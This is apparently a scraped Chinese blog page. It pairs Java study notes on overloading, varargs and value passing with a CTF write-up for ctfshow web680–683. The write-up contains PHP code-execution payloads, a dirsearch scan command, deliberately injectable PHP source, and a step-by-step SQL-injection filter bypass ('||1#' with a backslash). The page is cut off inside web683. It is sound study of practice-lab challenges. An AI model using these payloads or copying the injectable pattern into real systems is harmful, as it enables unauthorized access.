class="comment">//如下的4个方法就构成了重载</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getSum</span><span class="params">(<span class="keyword">int</span> i ,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">        System.out.println(i+j);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getSum</span><span class="params">(<span class="keyword">double</span> d1 , <span class="keyword">double</span> d2 )</span></span>&#123;</span><br><span class="line">        System.out.println(d1+d2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getSum</span><span class="params">(String s,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getSum</span><span class="params">(<span class="keyword">int</span> i,String s)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    不构成重载</span></span><br><span class="line"><span class="comment">//    public int getSum(int i ,int j)&#123;</span></span><br><span class="line"><span class="comment">//        return 0;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//    public void getSum(int m ,int n)&#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//    private void getSum(int i ,int j)&#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>练习：</p>
<p>1.编写程序，定义三个重载方法并调用。方法名为mOL。三个方法分别接收一个int参数、两个int参数、一个字符串参数。分别执行平方运算并输出结果，相乘并输出结果，输出字符串信息。在主类的main ( )方法中分别用参数区别调用三个方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OverLoadExer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        OverLoadExer p = <span class="keyword">new</span> OverLoadExer();</span><br><span class="line">        p.mOL(<span class="number">3</span>);</span><br><span class="line">        p.mOL(<span class="number">4</span>,<span class="number">6</span>);</span><br><span class="line">        p.mOL(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如下三个方法构成重载</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mOL</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">        System.out.println(i*i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mOL</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">        System.out.println(i*j);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mOL</span><span class="params">(String s)</span></span>&#123;</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.定义三个重载方法max( )，第一个方法求两个int值中的最大值，第二个方法求两个double值中的最大值，第三个方法求三个double值中的最大值，并分别调用三个方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OverLoadExer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        OverLoadExer p = <span class="keyword">new</span> OverLoadExer();</span><br><span class="line">       p.max(<span class="number">5.0</span>,<span class="number">3.0</span>,<span class="number">7.0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如下三个方法构成重载</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j )</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&gt;j)&#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(j);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">max</span><span class="params">(<span class="keyword">double</span> i,<span class="keyword">double</span> j )</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&gt;j)&#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(j);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">max</span><span class="params">(<span class="keyword">double</span> i,<span class="keyword">double</span> j,<span class="keyword">double</span> k )</span></span>&#123;</span><br><span class="line">        <span class="keyword">double</span> d = (i&gt;j)? i:j;</span><br><span class="line">        <span class="keyword">double</span> max=(d&gt;k)?d:k;</span><br><span class="line">        System.out.println(max);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="可变个数的形参的方法"><a href="#可变个数的形参的方法" class="headerlink" title="可变个数的形参的方法"></a>可变个数的形参的方法</h4><p>具体使用：</p>
<p>1.1可变个数形参的格式: 数据类型 . . . 变量名<br>1.2当调用可变个数形参的方法时，传入的参数个数可以是，0个，1个,2个，。。。<br>1.3可变个数形参的方法与本类中方法名相同， 形参不同的方法之间构成重载<br>1.4可变个数形参的方法与本类中方法名相同， 形参类型也相同的数组之间不构成重载。换句话说，二者不能共存<br>1.5可变个数形参在方法的形参中，必须声明在形参列表末尾<br>1.6可变个数形参在方法的形参中，最多只能声明一个可变形参。</p>
<p><img src="/2022/04/13/JAVA/image-20220430201756750.png" alt="image-20220430201756750"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodArgsTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        MethodArgsTest test = <span class="keyword">new</span> MethodArgsTest();</span><br><span class="line">        test.show(<span class="number">12</span>);</span><br><span class="line">        test.show(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    public void show(String s)&#123;</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;show(String)&quot;);  //show(String)</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">(String ... strs)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;show(String ... strs)&quot;</span>);<span class="comment">//show(String ... strs)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="方法参数的值传递机制"><a href="#方法参数的值传递机制" class="headerlink" title="方法参数的值传递机制"></a><strong>方法参数的值传递机制</strong></h4><p>关于变量的赋值：</p>
<p>如果变量是基本数据类型，此时赋值的是变量所保存的数据值。<br>如果变量是引用数据类型，此时赋值的是变量所保存的数据的地址值。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.cj.java1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ValueTransferTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;***********基本数据类型***********&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> m = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">int</span> n = m;</span><br><span class="line">        System.out.println(<span class="string">&quot;m=&quot;</span>+m+<span class="string">&quot;, n=&quot;</span>+n);</span><br><span class="line">        n = <span class="number">20</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;m=&quot;</span>+m+<span class="string">&quot;, n=&quot;</span>+n);</span><br><span class="line">        System.out.println(<span class="string">&quot;***********引用数据类型***********&quot;</span>);</span><br><span class="line">        Order o1 = <span class="keyword">new</span> Order();</span><br><span class="line">        o1.orderId = <span class="number">1001</span>;</span><br><span class="line">        Order o2 = o1;  <span class="comment">//赋值以后，o1,o2的地址值相同，都指向了堆空间中同一个对象实体</span></span><br><span class="line">        System.out.println(<span class="string">&quot;o1.orderId = &quot;</span>+o1.orderId+<span class="string">&quot;, o2.orderId = &quot;</span>+o2.orderId);</span><br><span class="line">        o2.orderId = <span class="number">1002</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;o1.orderId = &quot;</span>+o1.orderId+<span class="string">&quot;, o2.orderId = &quot;</span>+o2.orderId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Order</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> orderId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关于方法形参的传递机制:值传递</p>
<p>1、形参:方法定义时，声明的小括号内的参数<br>      实参:方法调用时，实际传递给形参的数据</p>
<p>2.值传递机制:<br>如果参数是基本数据类型，此时实参赋给形参的是实参真实存储的数据值。</p>
<p>如果参数是引用数据类型，此时实参赋给形参的是实参存储数据的地址值。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">失败案例</span><br><span class="line"><span class="keyword">package</span> com.cj.java1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ValueTransferTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//交换两个变量的值的操作</span></span><br><span class="line">        <span class="keyword">int</span> m=<span class="number">10</span>;</span><br><span class="line">        <span class="keyword">int</span> n=<span class="number">20</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;m = &quot;</span>+m+<span class="string">&quot;, n = &quot;</span>+n);</span><br><span class="line"><span class="comment">//        int temp = m;</span></span><br><span class="line"><span class="comment">//        m = n;</span></span><br><span class="line"><span class="comment">//        n = temp;</span></span><br><span class="line">        ValueTransferTest t1 = <span class="keyword">new</span> ValueTransferTest();</span><br><span class="line">        t1.swap(m,n);</span><br><span class="line">        System.out.println(<span class="string">&quot;m = &quot;</span>+m+<span class="string">&quot;, n = &quot;</span>+n);  <span class="comment">//没有发生交换</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> m , <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp = m;</span><br><span class="line">        m = n;</span><br><span class="line">        n = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/13/JAVA/image-20220502155242024.png" alt="image-20220502155242024"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">成功案例</span><br><span class="line"><span class="keyword">package</span> com.cj.java1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ValueTransferTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Data data = <span class="keyword">new</span> Data();</span><br><span class="line">        data.m = <span class="number">10</span>;</span><br><span class="line">        data.n = <span class="number">20</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;m = &quot;</span>+data.m+<span class="string">&quot;, n = &quot;</span>+data.n);</span><br><span class="line">        <span class="comment">//交换两个变量的值的操作</span></span><br><span class="line">        ValueTransferTest test= <span class="keyword">new</span> ValueTransferTest();</span><br><span class="line">        test.swap(data);</span><br><span class="line">        System.out.println(<span class="string">&quot;m = &quot;</span>+data.m+<span class="string">&quot;, n = &quot;</span>+data.n);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(Data data)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp = data.m;</span><br><span class="line">        data.m = data.n;</span><br><span class="line">        data.n = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Data</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/13/JAVA/image-20220502164416651.png" alt="image-20220502164416651"></p>
<p>练习：</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/" class="post-title-link" itemprop="url">CTF大赛原题</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-03-31 15:30:16" itemprop="dateCreated datePublished" datetime="2022-03-31T15:30:16+08:00">2022-03-31</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-04-03 19:47:10" itemprop="dateModified" datetime="2022-04-03T19:47:10+08:00">2022-04-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>27k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>24 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="web680"><a href="#web680" class="headerlink" title="web680"></a>web680</h2><p>code=phpinfo();先看下disable_function，有一堆过滤。并且open_basedir做了目录限制</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload: ?<span class="keyword">code</span>=var_dump(scandir(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">code</span>=highlight_file(<span class="string">&#x27;secret_you_never_know&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="web681"><a href="#web681" class="headerlink" title="web681"></a>web681</h2><p>类型：源码泄露 .svn可以获得源码</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dirsearch</span>扫描：dirsearch -u http://d<span class="number">8</span>bd<span class="number">48</span>e<span class="number">1</span>-<span class="number">56</span>ad-<span class="number">4</span>fb<span class="number">3</span>-ba<span class="number">03</span>-<span class="number">3072811794</span>c<span class="number">8</span>.challenge.ctf.show/ -t <span class="number">4</span> -e php</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-09-24 14:58:16</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-09-24 16:04:49</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;common.php&quot;</span>;</span><br><span class="line"> </span><br><span class="line">session_start();</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">  <span class="variable">$name</span> = str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>, trim(waf(<span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>])));<span class="comment">//这里会将传入的参数去单引号，并且要过waf。</span></span><br><span class="line">  <span class="keyword">if</span> (strlen(<span class="variable">$name</span>) &gt; <span class="number">11</span>)&#123; <span class="comment">//这里长度不能大于11</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;name too long&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select count(*) from ctfshow_users where username = &#x27;<span class="subst">$name</span>&#x27; or nickname = &#x27;<span class="subst">$name</span>&#x27;&quot;</span>;  <span class="comment">//这里存在sql注入，要点是</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> db();</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;select_one_array(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>[<span class="number">0</span>])&#123;  <span class="comment">//只要传入为true就会返回flag</span></span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;hat&#x27;</span>] = <span class="string">&#x27;black&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;good job&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;hat&#x27;</span>] = <span class="string">&#x27;green&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得出空格被过滤可以使用/**/绕过</p>
<p>单引号过滤可以使用“\”绕过</p>
<p>或者登录的时候抓包，比如我们传name=123会返回sql语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> ctfshow_users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;123&#x27;</span> <span class="keyword">or</span> nickname <span class="operator">=</span> <span class="string">&#x27;123&#x27;</span></span><br><span class="line">然后试了下单引号，发现会被吞。</span><br><span class="line">那就试下反斜杠，</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> ctfshow_users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;123\&#x27;</span> <span class="keyword">or</span> nickname <span class="operator">=</span> <span class="string">&#x27;123\&#x27;</span></span><br><span class="line">这样相当于执行</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> ctfshow_users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span><span class="number">123</span>\<span class="string">&#x27;      xxx：123\&#x27;</span> <span class="keyword">or</span> nickname <span class="operator">=</span></span><br><span class="line">所以先整个万能密码</span><br><span class="line">name<span class="operator">=</span><span class="operator">||</span><span class="number">1</span>#   或者<span class="keyword">or</span>(<span class="number">1</span>)<span class="operator">%</span><span class="number">23</span>   记得加\</span><br><span class="line">注释前需要闭合前面引号，否则注释符会被当做引号里的字符</span><br><span class="line">最终语句为</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> ctfshow_users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;||1#\&#x27;</span> <span class="keyword">or</span> nickname <span class="operator">=</span> <span class="string">&#x27;||1#\&#x27;</span></span><br><span class="line">相当于   </span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> ctfshow_users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;xxxxx‘||1#\&#x27;</span></span><br><span class="line">然后就出flag了。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web682"><a href="#web682" class="headerlink" title="web682"></a>web682</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/122998220">详见</a></p>
<h2 id="web683"><a href="#web683" class="headerlink" title="web683"></a>web683</h2><p>类型：php特性，弱类型</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-09-24 17:34:28</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-09-24 20:32:56</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;秀&#x27;</span>]))&#123;</span><br><span class="line">       <span class="keyword">if</span>(!is_numeric(<span class="variable">$_GET</span>[<span 